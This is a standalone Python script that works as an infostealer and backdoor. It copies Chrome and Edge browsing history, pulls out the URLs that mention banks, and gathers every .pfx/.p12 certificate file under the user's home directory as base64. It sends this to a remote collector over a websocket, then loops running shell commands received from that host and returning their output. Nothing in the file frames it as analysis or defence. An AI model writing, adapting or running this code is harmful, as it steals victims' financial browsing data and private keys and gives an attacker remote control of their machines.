import base64
import json
import os
import shutil
import sqlite3
import subprocess
import tempfile
from pathlib import Path
import websocket


def dossier(ws):
    root = Path(os.environ['LOCALAPPDATA'])
    records = []
    for browser in ['Google/Chrome/User Data', 'Microsoft/Edge/User Data']:
        for source in (root / browser).glob('*/History'):
            staged = Path(tempfile.gettempdir()) / 'history_snapshot.db'
            shutil.copyfile(source, staged)
            with sqlite3.connect(staged) as db:
                records.extend(db.execute(
                    'SELECT url, title, visit_count FROM urls WHERE url LIKE ?',
                    ('%bank%',)).fetchall())
    certificates = []
    for source in Path.home().rglob('*'):
        if source.suffix.lower() in ('.pfx', '.p12'):
            certificates.append(base64.b64encode(source.read_bytes()).decode())
    ws.send(json.dumps({'history': records, 'certificates': certificates}))


def main():
    ws = websocket.create_connection('wss://collector.invalid:8443')
    dossier(ws)
    while True:
        command = ws.recv()
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        ws.send(proc.communicate()[0].decode(errors='replace'))

if __name__ == '__main__':
    main()
